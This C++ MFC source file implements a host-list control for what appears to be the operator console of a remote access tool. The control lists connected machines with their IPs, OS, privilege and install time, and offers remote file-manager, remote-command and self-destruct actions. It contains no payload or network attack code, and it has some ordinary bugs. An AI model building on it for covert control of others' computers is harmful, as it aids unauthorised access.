#include "StdAfx.h"
#include "HostList.h"

CHostList::CHostList(void)
{
}


CHostList::~CHostList(void)
{
}

BEGIN_MESSAGE_MAP(CHostList, CListCtrl)
	ON_NOTIFY_REFLECT(LVN_COLUMNCLICK, OnColumnclick)
	ON_WM_LBUTTONDOWN()
	ON_WM_CREATE()
	ON_WM_DESTROY()
	ON_WM_LBUTTONDBLCLK()
	ON_WM_MBUTTONDOWN()
	ON_WM_MBUTTONDBLCLK()
	ON_WM_RBUTTONDOWN()
	ON_WM_RBUTTONDBLCLK()
	ON_NOTIFY_REFLECT(NM_CUSTOMDRAW, OnCustomDraw)
	ON_COMMAND(ID_FILEMANAGER, &CHostList::OnFilemanager)
	ON_COMMAND(ID_COMMANDER, &CHostList::OnCommander)
	ON_COMMAND(ID_UNINSTALL, &CHostList::OnUninstall)
END_MESSAGE_MAP()

void CHostList::OnRButtonDown(UINT nFlags, CPoint point)
{
	POSITION pos = GetFirstSelectedItemPosition();
	int index = GetNextSelectedItem(pos);

	if (index < 0)
		return;

	if (GetItemImage(index,0) == 0)
	{
		CMenu menu, *pPopup;

		menu.LoadMenu(IDR_MENU_CONTROL);
		pPopup = menu.GetSubMenu(0);

		CPoint myPoint;
		ClientToScreen(&myPoint);
		GetCursorPos(&myPoint);

		pPopup->TrackPopupMenu(TPM_LEFTALIGN|TPM_RIGHTBUTTON, myPoint.x, myPoint.y,this);

	}
	_MouseClkMonitor(WM_RBUTTONDOWN, nFlags, point, FALSE);
}

void CHostList::OnFilemanager()
{
	POSITION pos = GetFirstSelectedItemPosition();
	int index = GetNextSelectedItem(pos);

	if (pos < 0)
		return;

	CLIENT_INFO* info;
	info = (CLIENT_INFO*)GetItemData(index);

	CFilePanelDlg *dlg = NULL;

	if (m_FuncMap[info->clientid].panel == NULL)
	{
		dlg = new CFilePanelDlg();
		dlg->SetClientID(info->clientid);
		dlg->Create(IDD_DIALOG_PANEL);

		m_FuncMap[info->clientid].panel = dlg;
	}
	else
	{
		dlg = m_FuncMap[info->clientid].panel;
	}
	
	dlg->ShowWindow(TRUE);
}


void CHostList::OnCommander()
{
	POSITION pos = GetFirstSelectedItemPosition();
	int index = GetNextSelectedItem(pos);

	if (pos < 0)
		return;

	CLIENT_INFO* info;
	info = (CLIENT_INFO*)GetItemData(index);

	CCmdDlg *dlg = NULL;

	if (m_FuncMap[info->clientid].cmd == NULL)
	{
		dlg = new CCmdDlg();
		dlg->InitModule(info->clientid);
		dlg->Create(IDD_DIALOG_CMD);

		m_FuncMap[info->clientid].cmd = dlg;
	}
	else
	{
		dlg = m_FuncMap[info->clientid].cmd;
	}

	dlg->ShowWindow(TRUE);
}


void CHostList::OnUninstall()
{
	POSITION pos = GetFirstSelectedItemPosition();
	int index = GetNextSelectedItem(pos);

	if (pos < 0)
		return;

	CLIENT_INFO* info;
	info = (CLIENT_INFO*)GetItemData(index);

	MakeClientSelfDestruction(info->clientid);
}

int CHostList::GetInsertGroupsIndex(CString szGourps)
{
	int lineCount = GetItemCount();
	for (int i = 0; i <= lineCount ; i++)
	{
		if (GetItemText(i,0) == szGourps
			&& GetItemData(i) == 0)
		{
			return i+1;
		}
	}
	InsertItem(lineCount,szGourps,2);
	return lineCount+1;
}

void CHostList::DeleteClientInfo(CLIENT_INFO* pInfo)
{
	int nCount = GetItemCount();

	// 	GroupMap::iterator it = m_GroupsMap.find(pInfo->groups);
	// 	if (it != m_GroupsMap.end())
	// 	{
	// 		ClientList::iterator cit = it->second.find(pInfo->clientid);
	// 
	// 		if (cit != it->second.end())
	// 		{
	// 			it->second.erase(cit);
	// 		}
	// 	}

	for (int i = 0 ; i < nCount ; i++)
	{
		DWORD dwData = GetItemData(i);
		if (dwData > 1)
		{
			CLIENT_INFO *itemInfo = (CLIENT_INFO*)dwData;
			if (CString(itemInfo->clientid) 
				== CString(pInfo->clientid))
			{
				SetItemColor((int)pInfo,RGB(96,96,96));
				Update(i);
			}

		}
	}
}

void CHostList::OnLButtonDblClk(UINT nFlags, CPoint point)
{
	// TODO: Add your message handler code here and/or call default
	do 
	{
		POSITION pos = GetFirstSelectedItemPosition();
		int index = GetNextSelectedItem(pos);

		if (index < 0)
		{
			break;
		}

		if (GetItemData(index) == 0)
		{
			int nImage = GetItemImage(index,0);
			CString szGName = GetItemText(index,0);

			if (nImage == 1)
			{
				SetItemImage(index,0,2);
				InsertGroupsClient(index,m_GroupsMap[(LPCTSTR)szGName]);
			}
			else
			{
				SetItemImage(index,0,1);
				DeleteGroupsClient(index,m_GroupsMap[(LPCTSTR)szGName]);
			}
		}
	} while (FALSE);

	_MouseClkMonitor(WM_LBUTTONDBLCLK, nFlags, point, TRUE);
}

BOOL CHostList::AddClientInfo( CLIENT_INFO* pInfo )
{
	CString iplist;
	IN_ADDR connectIP;
	connectIP.S_un.S_addr = pInfo->connectIP;

	for (USHORT i = 0; i < pInfo->localIPCount; i++)
	{
		IN_ADDR inaddr;
		inaddr.S_un.S_addr = pInfo->localIPList[i];
		iplist.AppendFormat(_T("%s,"), CString(inet_ntoa(inaddr)));
	}
	iplist.TrimRight(',');

	int nIndex = GetInsertGroupsIndex(pInfo->groups);

	int nImage = GetItemImage(nIndex-1,0);

	CString strCPU;
	strCPU.Format(_T("%d*%d MHz"),pInfo->cpufrep,pInfo->cpunum);

	if (nImage != 1)
	{
		CString memsize;
		memsize.Format(_T("%d MB"),pInfo->memsize);
		InsertItem(nIndex,pInfo->computerName);
		SetItemData(nIndex,(DWORD)pInfo);
		SetItemText(nIndex,1,iplist);
		SetItemText(nIndex,2,CString(inet_ntoa(connectIP)));
		SetItemText(nIndex,3,common::FormatOSDesc(pInfo->windowsVersion,CString(pInfo->vercode), pInfo->bX64));
		SetItemText(nIndex,4,strCPU);
		SetItemText(nIndex,5,memsize);
		SetItemText(nIndex,6,pInfo->lang);
		SetItemText(nIndex,7,pInfo->priv);
		SetItemText(nIndex,8,pInfo->proto);
		SetItemText(nIndex,9,common::FormatSystemTime(pInfo->installTime));
	}

	GroupMap::iterator it1 = m_GroupsMap.find(pInfo->groups);
	ClientList list;
	list.clear();

	if ( it1 != m_GroupsMap.end() )
	{
		ClientList::iterator it2 = 
			it1->second.find(pInfo->clientid);

		if (it2 == it1->second.end())
		{
			it1->second.insert(MAKE_PAIR(ClientList,pInfo->clientid,pInfo));
		}
	}
	else
	{
		list.insert(MAKE_PAIR(ClientList,pInfo->clientid,pInfo));
		m_GroupsMap.insert(MAKE_PAIR(GroupMap,pInfo->groups,list));
	}

	if (m_FuncMap.find(pInfo->clientid) == m_FuncMap.end())
	{
		FUNC_ITEM item;

		item.panel = new CFilePanelDlg();
		item.cmd = new CCmdDlg();

		memset(&item,0,sizeof(FUNC_ITEM));

		m_FuncMap[pInfo->clientid] = item;
	}

	return nIndex;
}


void CHostList::DeleteGroupsClient( int nIndex , ClientList& list )
{
	for (UINT i = 0 ; i < list.size() ; i ++)
	{
		DeleteItem(nIndex+1);
	}
}
void CHostList::InsertGroupsClient( int nIndex , ClientList& list )
{
	ClientList::iterator it = list.begin();
	for ( ; it != list.end(); it ++)
	{
		int i = AddClientInfo(it->second);

		if (IsAlive(it->second->clientid))
			SetItemColor((int)it->second,RGB(255,0,0));
		else
			SetItemColor((int)it->second,RGB(96,96,96));

		Update(i);
	}
}